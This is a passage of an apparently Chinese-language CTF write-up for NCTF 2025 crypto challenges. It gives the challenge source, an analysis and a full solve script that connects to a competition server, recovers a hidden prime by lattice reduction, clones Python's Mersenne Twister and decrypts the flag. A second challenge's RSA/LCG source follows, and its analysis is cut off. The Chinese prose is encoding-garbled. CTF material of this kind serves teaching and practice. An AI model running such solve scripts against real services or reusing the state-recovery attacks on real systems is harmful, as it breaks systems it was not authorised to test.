class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getrandint</span>(<span class="hljs-params">n:<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(urandom(n//<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)) % <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>,n)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FHE</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.p = getPrime(<span class="hljs-number">77</span>)<br>        <span class="hljs-variable language_">self</span>.pubkeys = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-variable language_">self</span>.pubkeys.append(<span class="hljs-variable language_">self</span>.p * getrandint(<span class="hljs-number">177</span>) + (getrandint(<span class="hljs-number">17</span>) &lt;&lt; <span class="hljs-number">8</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,msg:<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] | <span class="hljs-built_in">bytes</span></span>):<br>        result = []<br>        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> msg:<br>            tmp = <span class="hljs-number">0</span><br>            shuffle_base = urandom(<span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> shuffle_base:<br>                x,y = <span class="hljs-built_in">divmod</span>(i,<span class="hljs-number">16</span>)<br>                tmp += x*<span class="hljs-variable language_">self</span>.pubkeys[y] + y*<span class="hljs-variable language_">self</span>.pubkeys[x]<br>            result.append(tmp + m)<br>        <span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><h3 id="åˆ†æ"><a class="markdownIt-Anchor" href="#åˆ†æ"></a> åˆ†æ</h3><ol><li><code>s = long_to_bytes(Random().getrandbits(20000))</code>ï¼Œå…ˆç”Ÿæˆçš„32bitsåœ¨sçš„ä½ä½ï¼Œæ€»å…±æœ‰625ä¸ª32bitsï¼Œè€Œæˆ‘ä»¬éœ€è¦çš„måœ¨æœ€é«˜ä½ï¼Œå³æœ€åç”Ÿæˆçš„32bitsã€‚æ˜¾ç„¶æˆ‘ä»¬éœ€è¦æ‰“MT19937é¢„æµ‹å‡ºæœ€åè¿™ä¸€ä¸ª32bitsï¼Œå‰é¢624*32=19968åˆšåˆšå¥½å¤Ÿç”¨ï¼Œç°åœ¨å°±æ˜¯è¦è§£å‡ºè¿™å‰é¢çš„19968ä½</li><li>åˆ†æFHE()ï¼Œé€šè¿‡è§‚å¯Ÿï¼Œ<code>shuffle_base</code>ç”Ÿæˆçš„è¿™åå…­è½®éšæœºæ— æ³•é¢„æµ‹ï¼Œéšæ„æœ€åç»“æœå¯ä»¥ç®€åŒ–ä¸º<code>result=p*A+256*B+m</code>ï¼Œåˆ†æå¾—å‡º<code>m=result%p%256</code>,æ‰€ä»¥æˆ‘ä»¬ç°åœ¨éœ€è¦æ±‚å‡ºp</li><li>æ˜¾ç„¶<code>p*A&gt;&gt;256*B&gt;&gt;m</code>ï¼Œé€šè¿‡AGCDå¯ä»¥æ±‚å‡ºpï¼Œå‚è€ƒ<a href="https://hasegawaazusa.github.io/agcd-note.html">AGCDè¿‘ä¼¼æœ€å¤§å…¬çº¦æ•°é—®é¢˜ | ç‹¬å¥ã®å°å±‹</a></li><li>æ‰“å®ŒMT19937åå°±æ²¡ä»€ä¹ˆå¯†ç å­¦æ–¹é¢çš„éš¾ç‚¹äº†ï¼Œä¸»è¦å°±æ˜¯ä¸€äº›æ•°æ®å¤„ç†</li></ol><h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><br>sh=remote(<span class="hljs-string">&quot;39.106.16.204&quot;</span>,<span class="hljs-number">13589</span>)<br><br>sh.recvuntil(<span class="hljs-string">b&#x27;ciphertext: &#x27;</span>)<br>ciphertext=sh.recvline().strip().decode()<br>sh.recvuntil(<span class="hljs-string">b&#x27; follows:&#x27;</span>)<br>sh.sendline(<span class="hljs-string">b&#x27;&#x27;</span>)<br>Keys=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30000</span>):<br>    sh.recvuntil(<span class="hljs-string">b&#x27;[+] &#x27;</span>)<br>    key=sh.recvline().strip().decode()<br>    Keys.append(<span class="hljs-built_in">int</span>(key))<br><br>sh.close()<br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(Keys) == <span class="hljs-number">30000</span><br><br>stri=<span class="hljs-string">&quot;&quot;</span><br>RNG = Random()<br>length = <span class="hljs-number">19968</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_a_row</span>(<span class="hljs-params">RNG</span>):<br>    row = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        t1 = <span class="hljs-built_in">bin</span>(RNG.getrandbits(<span class="hljs-number">32</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">for</span> tt <span class="hljs-keyword">in</span> t1:<br>            row+=tt<br>    <span class="hljs-keyword">return</span> row<br><span class="hljs-string">&quot;&quot;&quot;L = []</span><br><span class="hljs-string">for i in trange(length):</span><br><span class="hljs-string">    state = [0]*624</span><br><span class="hljs-string">    temp = &quot;0&quot;*i + &quot;1&quot;*1 + &quot;0&quot;*(length-1-i)</span><br><span class="hljs-string">    for j in range(624):</span><br><span class="hljs-string">        state[j] = int(temp[32*j:32*j+32],2)</span><br><span class="hljs-string">    RNG.setstate((3,tuple(state+[624]),None))</span><br><span class="hljs-string">    L.append(construct_a_row(RNG))</span><br><span class="hljs-string">L = Matrix(GF(2),L)</span><br><span class="hljs-string">save(L, &quot;matrix.sobj&quot;)&quot;&quot;&quot;</span><br><span class="hljs-comment">#è‡ªå·±æµ‹è¯•çš„æ—¶å€™å·²ç»ç”Ÿæˆå¥½äº†ï¼Œè¿™é‡ŒèŠ‚çœæ—¶é—´</span><br>L = load(<span class="hljs-string">&quot;matrix.sobj&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">30000</span>,<span class="hljs-number">2500</span>):<br><br>    le=<span class="hljs-number">10</span><br>    rho=<span class="hljs-number">22</span><br>    xs=Keys[i:i+le]<br><br>    <span class="hljs-comment">#https://hasegawaazusa.github.io/agcd-note.html</span><br>    A = ZZ(<span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, rho + <span class="hljs-number">1</span>))<br>    B = matrix(xs[<span class="hljs-number">1</span>:])<br>    C = matrix.diagonal([-xs[<span class="hljs-number">0</span>]] * (le - <span class="hljs-number">1</span>))<br>    M = matrix.block([[A, B], [ZZ(<span class="hljs-number">0</span>), C]])<br>    M = M.LLL()<br>    q0 = ZZ(M[<span class="hljs-number">0</span>, <span class="hljs-number">0</span>] / A).<span class="hljs-built_in">abs</span>()<br>    e0 = ZZ(xs[<span class="hljs-number">0</span>] % q0)<br>    p = ZZ((xs[<span class="hljs-number">0</span>] - e0) / q0)<br><br>    gift=[<span class="hljs-built_in">int</span>(j%p%<span class="hljs-number">256</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> Keys[i:i+<span class="hljs-number">2500</span>]]<br>    gift=[(gift[j]&lt;&lt;<span class="hljs-number">24</span>)+(gift[j+<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">16</span>)+(gift[j+<span class="hljs-number">2</span>]&lt;&lt;<span class="hljs-number">8</span>)+gift[j+<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(gift),<span class="hljs-number">4</span>)]<br>    gift=gift[::-<span class="hljs-number">1</span>]<br>    known = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> gift[<span class="hljs-number">1</span>:]:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(j)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">32</span>):<br>            known+=k<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] solve_left &quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br>    s = L.solve_left(vector(GF(<span class="hljs-number">2</span>),known))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok!&quot;</span>)<br>    init = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>,s)))<br>    state = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        state.append(<span class="hljs-built_in">int</span>(init[<span class="hljs-number">32</span>*j:<span class="hljs-number">32</span>*j+<span class="hljs-number">32</span>],<span class="hljs-number">2</span>))<br>        <br><br>    prng = Random()<br>    prng.setstate(<span class="hljs-built_in">tuple</span>([<span class="hljs-number">3</span>, <span class="hljs-built_in">tuple</span>(state+[<span class="hljs-number">624</span>]), <span class="hljs-literal">None</span>]))<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">624</span>):<br>        prng.getrandbits(<span class="hljs-number">32</span>)<br><br>    s=long_to_bytes(prng.getrandbits(<span class="hljs-number">32</span>))<br>    m=[j%p%<span class="hljs-number">256</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> Keys[i+<span class="hljs-number">2500</span>-<span class="hljs-number">4</span>:i+<span class="hljs-number">2500</span>]]<br>    m=[(m[j]*inverse_mod(s[j],<span class="hljs-number">0x101</span>))%<span class="hljs-number">0x101</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)]<br>    x=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> m[::-<span class="hljs-number">1</span>]:<br>        x=(x&lt;&lt;<span class="hljs-number">2</span>)+j<br>    <span class="hljs-built_in">print</span>(x)<br>    stri+=<span class="hljs-built_in">bytes</span>([x])<br><br><span class="hljs-built_in">print</span>(AES.new(md5(stri).digest(),AES.MODE_ECB).decrypt(ciphertext))<br></code></pre></td></tr></table></figure><h2 id="archav"><a class="markdownIt-Anchor" href="#archav"></a> archav</h2><h3 id="é¢˜ç›®-2"><a class="markdownIt-Anchor" href="#é¢˜ç›®-2"></a> é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> urandom,getenv<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LCG</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,seed:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-variable language_">self</span>.p = getPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.a = getPrime(<span class="hljs-number">1023</span>)<br>        <span class="hljs-variable language_">self</span>.b = getPrime(<span class="hljs-number">1023</span>)<br>        <span class="hljs-variable language_">self</span>.status = seed<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">next</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        ret = <span class="hljs-variable language_">self</span>.status<br>        <span class="hljs-variable language_">self</span>.status = (<span class="hljs-variable language_">self</span>.status * <span class="hljs-variable language_">self</span>.a + <span class="hljs-variable language_">self</span>.b) % <span class="hljs-variable language_">self</span>.p<br>        <span class="hljs-keyword">return</span> ret<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crystal_trick</span>(<span class="hljs-params">m:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    m = <span class="hljs-built_in">bytearray</span>(m)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(m)):<br>        m[i] = reduce(<span class="hljs-keyword">lambda</span> x,y: x^y^urandom(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>],m[:i],m[i])<br>    <span class="hljs-keyword">return</span> m<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RSA</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        p = getStrongPrime(<span class="hljs-number">1024</span>)<br>        q = getStrongPrime(<span class="hljs-number">1024</span>)<br>        <span class="hljs-variable language_">self</span>.p = p<br>        <span class="hljs-variable language_">self</span>.N = p * q<br>        <span class="hljs-variable language_">self</span>.e = <span class="hljs-number">65537</span><br>        <span class="hljs-variable language_">self</span>.d = <span class="hljs-built_in">pow</span>(<span class="hljs-variable language_">self</span>.e, -<span class="hljs-number">1</span>, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,m:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(m,<span class="hljs-variable language_">self</span>.e,<span class="hljs-variable language_">self</span>.N)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,c:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(c,<span class="hljs-variable language_">self</span>.d,<span class="hljs-variable language_">self</span>.N) <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRSA1</span>(<span class="hljs-title class_ inherited__">RSA</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,m:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().encrypt(<span class="hljs-built_in">int</span>.from_bytes(m)).to_bytes(<span class="hljs-number">256</span>)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,c:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().decrypt(<span class="hljs-built_in">int</span>.from_bytes(c)).to_bytes(<span class="hljs-number">256</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyRSA2</span>(<span class="hljs-title class_ inherited__">RSA</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">self,m:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>.from_bytes(m),<span class="hljs-variable language_">self</span>.e,<span class="hljs-variable language_">self</span>.N).to_bytes(<span class="hljs-number">256</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self,c:<span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        m = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>.from_bytes(c),<span class="hljs-variable language_">self</span>.d,<span class="hljs-variable language_">self</span>.N).to_bytes(<span class="hljs-number">256</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hibiscus is here to trick your decryption result!!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> crystal_trick(m)<br><br>menu = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Welcome to NCTF 2025 arcahv challenge!</span><br><span class="hljs-string"></span><br><span class="hljs-string">--- Menu ---</span><br><span class="hljs-string">[1] View encrypted flag and hint</span><br><span class="hljs-string">[2] Play with the decryption orcale</span><br><span class="hljs-string">[3] Get some random numbers for fun</span><br><span class="hljs-string">[4] Exit</span><br><span class="hljs-string"></span><br><span class="hljs-string">Your Option &gt; &#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Loading, please wait...&#x27;</span>)<br>    <br>    <span class="hljs-comment"># flag = open(&#x27;flag.txt&#x27;).read().strip().encode()</span><br>    flag = getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>).encode()<br>    attempts = <span class="hljs-number">75</span><br>    r1 = MyRSA1()<br>    r2 = MyRSA2()<br>    hint1 = r2.encrypt(r1.p.to_bytes(<span class="hljs-number">128</span>))<br><br>    key = urandom(<span class="hljs-number">16</span>)<br>    hint2 = AES.new(key,AES.MODE_ECB).encrypt(r1.N.to_bytes(<span class="hljs-number">256</span>))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">flag_and_hint</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Encrypted flag: <span class="hljs-subst">&#123;r1.encrypt(flag).<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Hint1: <span class="hljs-subst">&#123;hint1.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Hint2: <span class="hljs-subst">&#123;hint2.<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">rsachal</span>(): <br>        <span class="hljs-keyword">global</span> attempts<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Since you didn&#x27;t v Hibiscus 50 on crazy thursday, Hibiscus decided to do some trick on your decryption result!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Your pubkey:(<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(r2.N)[<span class="hljs-number">2</span>:]&#125;</span>,<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(r2.e)[<span class="hljs-number">2</span>:]&#125;</span>)&#x27;</span>)<br><br>        <span class="hljs-keyword">while</span> attempts &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Do you still want to try decryption(y/[n])?&#x27;</span>) != <span class="hljs-string">&#x27;y&#x27;</span>:<br>                <span class="hljs-keyword">break</span><br><br>            c = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>(<span class="hljs-string">f&#x27;You have <span class="hljs-subst">&#123;attempts&#125;</span> remaining access to decryption orcale!\nYour ciphertext(in hex):&#x27;</span>))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Result: <span class="hljs-subst">&#123;r2.decrypt(c).<span class="hljs-built_in">hex</span>()&#125;</span>&#x27;</span>)<br>            attempts -= <span class="hljs-number">1</span><br>        <br>        <span class="hljs-keyword">if</span> attempts == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Unfortunately, you are out of decryption attempts! Come back again on nctf2026 ~&#x27;</span>)<br><br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lcgchal</span>():<br>        lcg = LCG(<span class="hljs-built_in">int</span>.from_bytes(key))<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Tempering with LCG generator, please wait...&#x27;</span>)<br>        <span class="hljs-keyword">while</span> urandom(<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xff</span>:<br>            lcg.<span class="hljs-built_in">next</span>()<br>        <br>        hexnums = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">hex</span>(lcg.<span class="hljs-built_in">next</span>())[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(hexnums) % <span class="hljs-number">16</span>:<br>            hexnums = hexnums.zfill((<span class="hljs-built_in">len</span>(hexnums) // <span class="hljs-number">16</span> + <span class="hljs-number">1</span>) * <span class="hljs-number">16</span>)<br>        <br>        idx = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Do you want another unsigned long long number(y/[n])?&#x27;</span>) == <span class="hljs-string">&#x27;y&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(hexnums[idx:idx+<span class="hljs-number">16</span>]),<span class="hljs-number">16</span>))<br>            idx = (idx + <span class="hljs-number">16</span>) % <span class="hljs-built_in">len</span>(hexnums)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hope you have fun during the challenge XD:)&#x27;</span>)<br>        exit(<span class="hljs-number">0</span>)<br><br>    fundc = &#123;<span class="hljs-number">1</span>:flag_and_hint,<span class="hljs-number">2</span>:rsachal,<span class="hljs-number">3</span>:lcgchal,<span class="hljs-number">4</span>:bye&#125;<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        opt = <span class="hljs-built_in">input</span>(menu)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(opt) == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> opt <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;1234&#x27;</span>:<br>            opt = <span class="hljs-string">&#x27;4&#x27;</span><br>        fundc[<span class="hljs-built_in">int</span>(opt)]()<br></code></pre></td></tr></table></figure><h3 id="åˆ†æ-2"><a class="markdownIt-Anchor" href="#åˆ†æ-2"></a> åˆ†æ</h3><p>ç¬¬ä¸€å±‚LCGï¼Œæ²¡å•¥éš¾ç‚¹ï¼Œå°±æ˜¯åªç»™5ä¸ªæ•°æ®éœ€è¦ç‚¹è¿æ°”æ‰èƒ½åˆ©ç”¨GCDæ±‚å‡ºæ¥æ¨¡æ•°ï¼Œä¸­é—´å‡ºé”™åŸºæœ¬å°±æ˜¯è¿™é‡Œé—®é¢˜ï¼Œå¤šè¯•å‡ æ¬¡å°±å¥½äº†ã€‚</p><p>ç¬¬äºŒå±‚RSA bytes orcaleï¼Œctf-wikiä¸Šè®²çš„å¾ˆè¯¦ç»†äº†<a 